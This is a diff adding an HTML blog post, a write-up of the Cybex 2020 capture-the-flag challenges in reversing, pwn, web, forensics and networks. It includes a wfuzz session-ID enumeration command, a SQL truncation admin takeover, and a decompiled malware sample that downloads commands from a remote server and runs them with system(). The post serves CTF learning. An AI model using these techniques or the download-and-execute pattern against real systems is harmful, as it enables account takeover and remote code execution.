@@ -1,0 +1,1165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Cybex 2020 CTF :: Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Cybex 2020 Challenges Writeup Reversing Serial .NET executable, using IDA we get the flag directly, since it is not obfuscated.
+Loadme For this challenge I used GHidra, although IDA could have worked exactly the same. Looking at the functions that the DLL exports, we see &amp;ldquo;catchMe&amp;rdquo;. Inside it, we can see an array of values in hexadecimal, to which an XOR is applied in a for loop. Applying the XOR key of the loop to the hexadecimal array we obtain the flag." />
+<meta name="keywords" content="Reversing, Pwn, Web, Forense, Redes, OSINT, Esteganografía" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://raulmart.in/posts/cybex-ctf-2020/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="https://raulmart.in/css/style.min.css">
+
+
+
+
+<link rel="stylesheet" href="https://raulmart.in/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://raulmart.in/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://raulmart.in/img/favicon/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:creator" content="Raúl Martín" />
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Cybex 2020 CTF :: Blog">
+<meta property="og:description" content="Cybex 2020 Challenges Writeup" />
+<meta property="og:url" content="https://raulmart.in/posts/cybex-ctf-2020/" />
+<meta property="og:site_name" content="Cybex 2020 CTF" />
+
+  <meta property="og:image" content="https://raulmart.in/cover/cybex.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2020-04-07 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="orange">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Blog
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/tags/writeup/">WriteUps</a></li>
+        
+      
+      
+    
+
+    
+    <div class="spacer"></div>
+    <ul class="language-selector">
+      <ul class="language-selector-current">
+          <li>English ▾</li>
+      </ul>
+      <ul class="language-selector__more hidden">
+        
+        <li><a href="https://raulmart.in/">English</a></li>
+        
+        <li><a href="https://raulmart.in/es/">Español</a></li>
+        
+      </ul>
+    </ul>
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/tags/writeup/">WriteUps</a></li>
+      
+    
+    
+    <hr />
+        
+          <li>
+            <a href="https://raulmart.in/">English</a>
+          </li>
+        
+          <li>
+            <a href="https://raulmart.in/es/">Español</a>
+          </li>
+        
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://raulmart.in/posts/cybex-ctf-2020/">Cybex 2020 CTF</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2020-04-07 
+      </span>
+    
+    
+    <span class="post-author">:: Raúl Martín</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://raulmart.in/tags/writeup/">writeup</a>&nbsp;
+    
+    #<a href="https://raulmart.in/tags/cybex-2020/">Cybex 2020</a>&nbsp;
+    
+    #<a href="https://raulmart.in/tags/ctf/">CTF</a>&nbsp;
+    
+  </span>
+  
+
+  
+    <img src="https://raulmart.in/cover/cybex.png" class="post-cover" alt="Cybex 2020 CTF" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="cybex-2020-challenges-writeup">Cybex 2020 Challenges Writeup<a href="#cybex-2020-challenges-writeup" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="reversing">Reversing<a href="#reversing" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="serial">Serial<a href="#serial" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>.NET executable, using IDA we get the flag directly, since it is not obfuscated.</p>
+<h3 id="loadme">Loadme<a href="#loadme" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>For this challenge I used GHidra, although IDA could have worked exactly the same.
+Looking at the functions that the DLL exports, we see &ldquo;catchMe&rdquo;. Inside it, we can see an array of values in hexadecimal, to which an XOR is applied in a for loop.
+Applying the XOR key of the loop to the hexadecimal array we obtain the flag.</p>
+<h3 id="terrorist-key">Terrorist Key<a href="#terrorist-key" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>In this challenge we have an obfuscated JS that generates keys. Given the terrorist&rsquo;s key, we will have to reverse the JS to find out what the original name, surname and date used to generate the password.</p>
+<p>Step 1: Clean up unnecessary code and rename variables
+
+
+
+  <div class="collapsable-code">
+    <input id="269183457" type="checkbox"  />
+    <label for="269183457">
+      <span class="collapsable-code__language">javascript</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-javascript" ><code>
+function generate() {
+    let nameHolder = $(&#34;#nameHolder&#34;).val().toLowerCase();
+    let surname1Holder = $(&#34;#surname1Holder&#34;).val().toLowerCase();
+    let surname2Holder = $(&#34;#surname2Holder&#34;).val().toLowerCase();
+    var regex = /^[A-Za-z]&#43;$/;
+    if (
+        !nameHolder.match(regex) |
+        !surname1Holder.match(regex) |
+        !surname2Holder.match(regex)
+    ) {
+        alert(&#34;¿Desde cuando un nombre tiene números o espacios?&#34;);
+        return;
+    }
+    if (
+        (nameHolder.length &gt; 10) |
+        (surname1Holder.length &gt; 10) |
+        (surname2Holder.length &gt; 10)
+    ) {
+        alert(&#34;El nombre o los apellidos no pueden superar los 10 caracteres&#34;);
+        return;
+    }
+    if (
+        (nameHolder.length &lt; 1) |
+        (surname1Holder.length &lt; 1) |
+        (surname2Holder.length &lt; 1)
+    ) {
+        alert(&#34;¿No tienes nombre o que?&#34;);
+        return;
+    }
+    let longestSurname;
+    let currentDate = new Date();
+    let day = currentDate.getDate();
+    let month = currentDate.getMonth() &#43; 1;
+    let year = currentDate.getFullYear();
+    let key = &#34;&#34;;
+    let key1 = &#34;&#34;;
+    let name = nameHolder;
+    if (name.length &lt; day) {
+        let _0xfa92xe = day - nameHolder.length;
+        for (let i = 0; i &lt; _0xfa92xe; i&#43;&#43;) {
+            name &#43;= nameHolder.charAt(i % nameHolder.length);
+        }
+    }
+    let surname1 = surname1Holder;
+    if (surname1.length &lt; day) {
+        let _0xfa92xe = day - surname1Holder.length;
+        for (let i = 0; i &lt; _0xfa92xe; i&#43;&#43;) {
+            surname1 &#43;= surname1Holder.charAt(i % surname1Holder.length);
+        }
+    }
+    let surname2 = surname2Holder;
+    if (surname2.length &lt; day) {
+        let _0xfa92xe = day - surname2Holder.length;
+        for (let i = 0; i &lt; _0xfa92xe; i&#43;&#43;) {
+            surname2 &#43;= surname2Holder.charAt(i % surname2Holder.length);
+        }
+    }
+    let userdata = [name, surname1, surname2];
+    let 3 = userdata.length;
+    for (let i = 0; i &lt; month; i&#43;&#43;) {
+        key1 &#43;= userdata[i % 3].charAt(day - 1);
+    }
+    let qwertypoasz = &#34;qwertypoasz&#34;;
+    let formattedDate = String(day &#43; month &#43; year);
+    formattedDate.split(&#34;&#34;).forEach(c =&gt; {
+        if (c &gt; qwertypoasz.length) {
+            key1 &#43;= qwertypoasz.charAt(c % qwertypoasz.length);
+            return;
+        }
+        key1 &#43;= qwertypoasz.charAt(c);
+    });
+    let key2 = &#34;&#34;;
+    if (surname1Holder.length != surname2Holder.length) {
+        if (surname1Holder.length &gt; surname2Holder.length) {
+            longestSurname = surname1Holder.length;
+        } else {
+            longestSurname = surname2Holder.length;
+        }
+    } else {
+        longestSurname = surname1Holder.length;
+    }
+    for (let i = 0; i &lt; longestSurname; i&#43;&#43;) {
+        if (i &lt; surname1Holder.length) {
+            key2 &#43;= String.fromCharCode(
+                ((surname1Holder.charCodeAt(i) - 97 &#43; month) % 26) &#43; 97
+            );
+        }
+        if (i &lt; surname2Holder.length) {
+            key2 &#43;= String.fromCharCode(
+                ((surname2Holder.charCodeAt(i) - 97 &#43; month) % 26) &#43; 97
+            );
+        }
+    }
+    let key3 = &#34;&#34;;
+    let _0xfa92x19 = surname2Holder &#43; surname1Holder;
+    name = nameHolder;
+    for (let i = 0; i &lt; name.length; i&#43;&#43;) {
+        key3 &#43;= String.fromCharCode(
+            ((name.charCodeAt(i) -
+                    97 &#43;
+                    _0xfa92x19.charCodeAt(i % _0xfa92x19.length) -
+                    97) %
+                26) &#43;
+            97
+        );
+    }
+    let key4 = &#34;&#34;;
+    let aopqmnzgxbcv = &#34;aopqmnzgxbcv&#34;;
+    let _0xfa92x1c = String(year &#43; surname2Holder.length);
+    _0xfa92x1c.split(&#34;&#34;).forEach(c =&gt; {
+        key4 &#43;= aopqmnzgxbcv.charAt(c % 12);
+    });
+    key4 &#43;= aopqmnzgxbcv.charAt(
+        surname1Holder.length % aopqmnzgxbcv.length
+    );
+	
+	// asfaeqew-swygxsmjwmiph-ccbnmp-paann
+	
+    key &#43;= key1 &#43; &#34;-&#34;;
+    key &#43;= key2 &#43; &#34;-&#34;;
+    key &#43;= key3 &#43; &#34;-&#34;;
+    key &#43;= key4;
+    $(&#34;#resultHolder&#34;)[&#34;val&#34;](key);
+}
+</code></pre>
+  </div>
+
+</p>
+<p>Step 2: break the key into pieces and recover each piece of data separately.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="983562471" type="checkbox"  />
+    <label for="983562471">
+      <span class="collapsable-code__language">javascript</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-javascript" ><code>
+function generate() {
+    let nameHolder = $(&#34;#nameHolder&#34;).val().toLowerCase();
+    let surname1Holder = $(&#34;#surname1Holder&#34;).val().toLowerCase();
+    let surname2Holder = $(&#34;#surname2Holder&#34;).val().toLowerCase();
+    var regex = /^[A-Za-z]&#43;$/;
+    if (
+        !nameHolder.match(regex) |
+        !surname1Holder.match(regex) |
+        !surname2Holder.match(regex)
+    ) {
+        alert(&#34;¿Desde cuando un nombre tiene números o espacios?&#34;);
+        return;
+    }
+    if (
+        (nameHolder.length &gt; 10) |
+        (surname1Holder.length &gt; 10) |
+        (surname2Holder.length &gt; 10)
+    ) {
+        alert(&#34;El nombre o los apellidos no pueden superar los 10 caracteres&#34;);
+        return;
+    }
+    if (
+        (nameHolder.length &lt; 1) |
+        (surname1Holder.length &lt; 1) |
+        (surname2Holder.length &lt; 1)
+    ) {
+        alert(&#34;¿No tienes nombre o que?&#34;);
+        return;
+    }
+    let longestSurname;
+    let currentDate = new Date();
+    let day = currentDate.getDate();
+    let month = currentDate.getMonth() &#43; 1;
+    let year = currentDate.getFullYear();
+    let key = &#34;&#34;;
+    let key1 = &#34;&#34;;
+    let name = nameHolder;
+    if (name.length &lt; day) {
+        let diff = day - nameHolder.length;
+        for (let i = 0; i &lt; diff; i&#43;&#43;) {
+            name &#43;= nameHolder.charAt(i % nameHolder.length);
+        }
+    }
+    let surname1 = surname1Holder;
+    if (surname1.length &lt; day) {
+        let diff = day - surname1Holder.length;
+        for (let i = 0; i &lt; diff; i&#43;&#43;) {
+            surname1 &#43;= surname1Holder.charAt(i % surname1Holder.length);
+        }
+    }
+    let surname2 = surname2Holder;
+    if (surname2.length &lt; day) {
+        let diff = day - surname2Holder.length;
+        for (let i = 0; i &lt; diff; i&#43;&#43;) {
+            surname2 &#43;= surname2Holder.charAt(i % surname2Holder.length);
+        }
+    }
+	
+	//key 1: asfaeqew
+    let userdata = [name, surname1, surname2];
+    for (let i = 0; i &lt; month; i&#43;&#43;) {
+		// asfa: 4 chars, el mes es 4.
+        key1 &#43;= userdata[i % 3].charAt(day - 1);
+    }
+    let qwertypoasz = &#34;qwertypoasz&#34;;
+    let formattedDate = String(day &#43; month &#43; year);
+    formattedDate.split(&#34;&#34;).forEach(c =&gt; {
+		// eqew --&gt; 2021, el mes es 4 --&gt; 2017 = dia &#43; año --&gt; FINAL: año es 1997, dia es 20
+        if (c &gt; qwertypoasz.length) {
+            key1 &#43;= qwertypoasz.charAt(c % qwertypoasz.length);
+            return;
+        }
+        key1 &#43;= qwertypoasz.charAt(c);
+    });
+	
+	
+    let key2 = &#34;&#34;; // swygxsmjwmiph --(-4)--&gt; osuctoifsield
+	// Apellido 1 *length 5*: outis
+	// Apellido 2 *length 8*: scofield
+    if (surname1Holder.length != surname2Holder.length) {
+        if (surname1Holder.length &gt; surname2Holder.length) {
+            longestSurname = surname1Holder.length;
+        } else {
+            longestSurname = surname2Holder.length;
+        }
+    } else {
+        longestSurname = surname1Holder.length;
+    }
+    for (let i = 0; i &lt; longestSurname; i&#43;&#43;) {
+        if (i &lt; surname1Holder.length) {
+            key2 &#43;= String.fromCharCode(
+                ((surname1Holder.charCodeAt(i) - 97 &#43; month) % 26) &#43; 97 // 97 es &#39;a&#39; en la tabla ASCII
+            );
+        }
+        if (i &lt; surname2Holder.length) {
+            key2 &#43;= String.fromCharCode(
+                ((surname2Holder.charCodeAt(i) - 97 &#43; month) % 26) &#43; 97 // 97 es &#39;a&#39; en la tabla ASCII
+            );
+        }
+    }
+	
+    let key3 = &#34;&#34;; // ccbnmp
+    let prekey = surname2Holder &#43; surname1Holder; // scofieldoutis
+    name = nameHolder;
+    for (let i = 0; i &lt; name.length; i&#43;&#43;) {
+        key3 &#43;= String.fromCharCode(
+            ((name.charCodeAt(i) - 97 &#43; prekey.charCodeAt(i % 13) - 97) % 26) &#43; 97 // Vigenere decode with key scofieldoutis --&gt; kaniel
+        );
+    }
+	
+	
+    let key4 = &#34;&#34;;
+    let aopqmnzgxbcv = &#34;aopqmnzgxbcv&#34;; // PENULTIMO: paan --&gt; 2005, length de surname2 es 8, año es 1997
+    let _0xfa92x1c = String(year &#43; surname2Holder.length);
+    _0xfa92x1c.split(&#34;&#34;).forEach(c =&gt; {
+        key4 &#43;= aopqmnzgxbcv.charAt(c % 12);
+    });
+    key4 &#43;= aopqmnzgxbcv.charAt(
+        surname1Holder.length % aopqmnzgxbcv.length //
+    );
+	
+	// asfaeqew-swygxsmjwmiph-ccbnmp-paann 
+	
+    key &#43;= key1 &#43; &#34;-&#34;;
+    key &#43;= key2 &#43; &#34;-&#34;;
+    key &#43;= key3 &#43; &#34;-&#34;;
+    key &#43;= key4;
+    $(&#34;#resultHolder&#34;)[&#34;val&#34;](key);
+}
+</code></pre>
+  </div>
+
+
+<p>Flag: CYBEX{KANIEL-OUTIS-SCOFIELD:20-04-1997}</p>
+<h3 id="narrow">nArrow<a href="#narrow" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>We have a, literally, arrow-shaped JavaScript.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="751642938" type="checkbox"  />
+    <label for="751642938">
+      <span class="collapsable-code__language">javascript</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-javascript" ><code>
+
+&#34;function chequea_flag(f){
+       s=i=&gt;i.replace(/./g,o=&gt;
+        \&#34;936\&#34;&#43;o.charCodeAt())
+         z=s=&gt;s.split``;i=18
+          a=z(s(1398&#43;&#39;7&#39;)).
+           join(&#43;&#43;i)&#43;\&#34;652\&#34;
+            s=z=&gt;z===a&#43;37
+             if(s(f&#43;=237
+              ))alert`!
+               !`;else
+                alert
+                 `B`
+                  }&#34;
+                  
+</code></pre>
+  </div>
+
+
+<p>Cleaning and formatting the code:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="259186437" type="checkbox"  />
+    <label for="259186437">
+      <span class="collapsable-code__language">javascript</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-javascript" ><code>
+function chequea_flag(f) {
+    s = i =&gt; i.replace(/./g, o =&gt; &#34;936&#34;&#43;o.charCodeAt())
+    z = s =&gt; s.split ``
+	i = 18
+	a = z(s(1398 &#43; &#39;7&#39;)).join(&#43;&#43;i) &#43; &#34;652&#34;
+    s = z =&gt; z === a &#43; 37
+    if (s(f &#43;= 237)) alert `!!`;
+    else
+        alert `B`
+}
+</code></pre>
+  </div>
+
+
+<p>We evaluate in the browser the first 5 lines, since they are constant and do not depend on the flag parameter f, obtaining:
+
+
+
+  <div class="collapsable-code">
+    <input id="379684215" type="checkbox"  />
+    <label for="379684215">
+      <span class="collapsable-code__language">Text</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-Text" ><code>
+9193196194199199193196195191199193196195197199193196195196199193196195195652
+</code></pre>
+  </div>
+
+</p>
+<p>so the flag is &ldquo;CYBEX {919319619419919919319619519119919319619519719919319619519619919319619519565}&rdquo; (without the last 2)</p>
+<h2 id="pwn">Pwn<a href="#pwn" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="integer-operations">Integer Operations<a href="#integer-operations" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>The int data type in languages like C and Java is limited to 32 bits, so the valid range of values it can take is between <code>2147483647</code> and<code> -2147483648</code>.
+Taking this into account, we can quickly make the first two steps by sending values close to that limit so that an overflow occurs (<code>2147483647 + 1 = -2147483648</code>,<code> -2147483648 - 1 = 2147483647</code>)</p>
+<p>Step 3: We are asked to obtain <code>1337</code> with the sum of you numbers strictly greater than <code>1337</code>
+
+
+
+  <div class="collapsable-code">
+    <input id="497681532" type="checkbox"  />
+    <label for="497681532">
+      <span class="collapsable-code__language">Text</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-Text" ><code>
+X: 4294967294 (maxint * 2) ---&gt; -2.
+Y: 1339
+</code></pre>
+  </div>
+
+</p>
+<p>Adding both numbers gives us 1337, the requested number.</p>
+<p>Step 4:
+
+
+
+  <div class="collapsable-code">
+    <input id="125483976" type="checkbox"  />
+    <label for="125483976">
+      <span class="collapsable-code__language">Text</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-Text" ><code>
+x &gt; 1337
+x² - 153153 = 417061379
+
+X**2 = 417214532
+</code></pre>
+  </div>
+
+</p>
+<p>To solve it I wrote the following code in Java (In Python it is more difficult since the numbers in Python do not have the same limitation as C and Java).</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="814695327" type="checkbox"  />
+    <label for="814695327">
+      <span class="collapsable-code__language">java</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-java" ><code>
+public static void main(String[] args) {
+	for (int i = 1337; i &lt; Integer.MAX_VALUE; i&#43;&#43;) {
+		int result = i * i - 153153;
+		if(result == 417061379){
+			System.out.println(i);
+		}
+	}
+}
+</code></pre>
+  </div>
+
+
+<p>The previous fragment calculates by brute force all the numbers that meet the requested condition, which gives us:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="982574163" type="checkbox"  />
+    <label for="982574163">
+      <span class="collapsable-code__language">Text</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-Text" ><code>
+132654
+1073609170
+1073874478
+2147350994
+</code></pre>
+  </div>
+
+
+<p>Using for example the smallest of them we obtain the flag: CYBEX {man_Im_gonna_quit_programming_who_tf_knew_signed_primitive_data_types_are_so_delicate_and_truncable}</p>
+<h2 id="web">Web<a href="#web" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="unsafe-behaviour">Unsafe Behaviour<a href="#unsafe-behaviour" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>In the first web challenge, we have a simple login form:</p>
+<p><img src="files/web1.PNG" alt="Login form"></p>
+<p>If we open the inspector the browser does strange things, what is happening?
+There may be Javascript code that is interfering with the browser itself, so we disable Javascript with any browser plugin for it, such as NoScript, and reload the page to analyze the code.</p>
+<p>Reviewing the only JS on the page, we found the requested username and password, admin and hunter2.
+With Javascript disabled to avoid redirecting us to the index.html, we login and obtain the flag.</p>
+<p>Flag: CYBEX{Cl13nT_s1D3_v4l1D4TIOn}</p>
+<h3 id="celebrities-keep-a-secret">Celebrities Keep A Secret<a href="#celebrities-keep-a-secret" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>When accessing the page we see that a profile is loaded using a POST with the parameter <code>idsesion</code>.
+To identify all valid values for that parameter, we will use the <code>wfuzz</code> tool:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="475298631" type="checkbox"  />
+    <label for="475298631">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+wfuzz -z range,0-10000 --hh 2069 -d &#34;idsesion=FUZZ&#34; http://51.38.191.113:1338/c7303adc0/miperfil.php
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                                                           
+===================================================================
+
+000001846:   200        65 L     129 W    2134 Ch     &#34;1845&#34;           --&gt; Chema Alonso, password INMUERKYPMYV63BRNMZV65BQL5TTA43TGFYH2===                                                                                                     
+000001992:   200        65 L     129 W    2125 Ch     &#34;1991&#34;           --&gt; Julio Urena, pasword OF2WK5DBNRUW4Z3FNZUWK4TPOM======                                                                                            
+000001996:   200        65 L     128 W    2137 Ch     &#34;1995&#34;           --&gt; IppSec, password NFWG65TFNBQWG23UNBSWE33Y                                                                                                     
+000001995:   200        65 L     128 W    2112 Ch     &#34;1994&#34;           --&gt; s4vitar, password NBSXS3LVPFRHKZLOMFZWC5DPMRXXG43PPFZTI5TJORQXE===
+
+</code></pre>
+  </div>
+
+
+<p>The password of each user are found in the web&rsquo;s HTML.
+After decoding the password of Chema Alonso with base32, we get the flag:</p>
+<p>Flag: CYBEX{1_l1k3_t0_g0ss1p}</p>
+<h3 id="coronao">Coronao<a href="#coronao" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Using the source code available in the <a href="https://github.com/Kx1z0/SQL-Truncation">author&rsquo;s repository</a> we see that it is vulnerable to SQL Truncation.</p>
+<p>To exploit the vulnerability, we registered an account with user <code>admin 1</code> (admin followed by 6 spaces and any other character) and a password known only to us. We login as <code>admin</code> and the chosen password.
+<a href="https://resources.infosecinstitute.com/sql-truncation-attack/">More information on how this attack works</a>.</p>
+<h2 id="forense">Forense<a href="#forense" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="people-are-bad">People are bad<a href="#people-are-bad" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Reviewing the strings of the file, we see interesting functions that make us suspect that we could be facing a Python program.</p>
+<p>Reviewing various documentation (especially interesting <a href="https://blog.attify.com/flare-on-6-ctf-writeup-part7/),">https://blog.attify.com/flare-on-6-ctf-writeup-part7/),</a> we extract all the files and decompile the entry point.
+To decompile the file, it is necessary to rebuild the headers first, for which we will use a simple python code compiled by us.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="358961724" type="checkbox"  />
+    <label for="358961724">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+poltatil@kali:~/CybexCTF/Forensic$ python3
+Python 3.7.7 (default, Apr  1 2020, 13:48:52) 
+[GCC 9.3.0] on linux
+Type &#34;help&#34;, &#34;copyright&#34;, &#34;credits&#34; or &#34;license&#34; for more information.
+&gt;&gt;&gt; import py_compile
+&gt;&gt;&gt; py_compile.compile(&#39;test.py&#39;)
+&#39;__pycache__/test.cpython-37.pyc&#39;
+&gt;&gt;&gt; exit()
+poltatil@kali:~/CybexCTF/Forensic$ ls -lshA
+total 7.1M
+4.0K -rw-r--r--  1 poltatil poltatil   16 Apr  5 01:39 header
+4.0K drwxr-xr-x  2 poltatil poltatil 4.0K Apr  5 01:43 __pycache__
+ 16K -rw-r--r--  1 poltatil poltatil  13K Apr  5 01:21 pyinstxtractor.py
+4.0K drwxr-xr-x 15 poltatil poltatil 4.0K Apr  5 01:35 python-decompile3
+4.0K drwxr-xr-x  5 poltatil poltatil 4.0K Apr  5 01:21 python-exe-unpacker
+4.0K drwxr-xr-x 15 poltatil poltatil 4.0K Apr  5 01:33 python-uncompyle6
+4.0K -rw-r--r--  1 poltatil poltatil  352 Apr  5 01:40 ready.pyc
+4.0K -rw-r--r--  1 poltatil poltatil   14 Apr  5 01:37 test.py
+4.0K -rw-r--r--  1 poltatil poltatil  336 Apr  5 01:35 WD.pyc
+7.0M -rw-r--r--  1 poltatil poltatil 7.0M Apr  5 01:13 WindowsDefender.exe
+4.0K drwxr-xr-x  3 poltatil poltatil 4.0K Apr  5 01:25 WindowsDefender.exe_extracted
+poltatil@kali:~/CybexCTF/Forensic$ xxd __pycache__/test.cpython-37.pyc 
+00000000: 420d 0d0a 0000 0000 371a 895e 0e00 0000  B.......7..^....
+00000010: e300 0000 0000 0000 0000 0000 0002 0000  ................
+00000020: 0040 0000 0073 0c00 0000 6500 6400 8301  .@...s....e.d...
+00000030: 0100 6401 5300 2902 5a04 686f 6c61 4e29  ..d.S.).Z.holaN)
+00000040: 01da 0570 7269 6e74 a900 7202 0000 0072  ...print..r....r
+00000050: 0200 0000 fa07 7465 7374 2e70 79da 083c  ......test.py..&lt;
+00000060: 6d6f 6475 6c65 3e01 0000 00f3 0000 0000  module&gt;.........
+poltatil@kali:~/CybexCTF/Forensic$ 
+poltatil@kali:~/CybexCTF/Forensic$ echo -n -e &#39;\x42\x0d\x0d\x0a\x00\x00\x00\x00\x37\x1a\x89\x5e\x0e\x00\x00\x00&#39; &gt; header
+poltatil@kali:~/CybexCTF/Forensic$ cat header WD.pyc &gt;ready.pyc
+poltatil@kali:~/CybexCTF/Forensic$ decompyle3 ready.pyc 
+</code></pre>
+  </div>
+
+
+
+
+
+  <div class="collapsable-code">
+    <input id="743186925" type="checkbox"  />
+    <label for="743186925">
+      <span class="collapsable-code__language">python</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-python" ><code>
+# decompyle3 version 3.3.2
+# Python bytecode 3.7 (3394)
+# Decompiled from: Python 3.7.7 (default, Apr  1 2020, 13:48:52) 
+# [GCC 9.3.0]
+# Embedded file name: Windows Defender.py
+# Size of source mod 2**32: 14 bytes
+import requests
+from os import system
+r1 = requests.get(&#39;https://cybexsec.es/pabc2/command1.txt&#39;)
+r2 = requests.get(&#39;https://cybexsec.es/pabc2/command2.txt&#39;)
+while 1:
+    if r1.text != &#39;&#39;:
+        if r2.text != &#39;&#39;:
+            system(r1.text)
+            system(r2.text)
+            exit()
+# okay decompiling ready.pyc
+</code></pre>
+  </div>
+
+
+<p>Reviewing the commands that the Malware will execute we see a second stage, but it does not seem to have anything interesting.
+In the base URL we see the C&amp;C login page: <code>https://cybexsec.es/pabc2/</code></p>
+<p>Accessing with the known admin / admin, we obtain the following base32 that will give us the flag.</p>
+<p><code>INMUERKYPNLTGXZUOIZV6NDMNRPXO4RQNZTV64ZQNUZXIMLNGN6Q====</code></p>
+<p>Flag: CYBEX{W3_4r3_4ll_wr0ng_s0m3t1m3}</p>
+<h2 id="redes">Redes<a href="#redes" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="un-pcap-otra-vez">¿Un PCAP otra vez?<a href="#un-pcap-otra-vez" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>In one of the posts to the login URL we have a somewhat strange password, considering that it should go in plain text:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="826941537" type="checkbox"  />
+    <label for="826941537">
+      <span class="collapsable-code__language">HTML</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-HTML" ><code>
+Form item: &#34;pw&#34; = &#34;FXL2DaZ5PdWdQXZ5Dqt2PdL5QNPoD2WaEUEzFNVoEdWbEdH4EqRnDKPqPKx1DUPqP2LpFKQyEqAcPaPoEax5PqD0QKczEUt4EaMcDdZnD2QyQKWzDNV2DUcaDKx5Dqx5QaH1QNZ5EaV2PaH5PqLoEKWbQUP0DaZoPqczPNHoDaD=&#34;
+</code></pre>
+  </div>
+
+
+<p>Doing &ldquo;rot 9&rdquo; and &ldquo;from base64&rdquo; using <a href="https://gchq.github.io/CyberChef/">CyberChef</a> we obtain the following hexadecimal hash:</p>
+<p><code>376be9ef13ac43b9a16ad6d8700163a85063ce296a72eb61689c34e9b47865e2b03fae1b1a609c189389f45eb9616b49c5151dd64221c9bad123</code></p>
+<p>Given the length of 512, it is possible that it is a SHA512 hash, looking at <a href="https://crackstation.net/">CrackStation</a> we see that it has already been cracked.</p>
+<p>Flag: CYBEX{pandora}</p>
+<h2 id="osint">OSINT<a href="#osint" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="ritual">Ritual<a href="#ritual" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>It looks like an abandoned hospital, Googling &ldquo;barcelona abandoned hospital&rdquo; we get a Wikipedia page.</p>
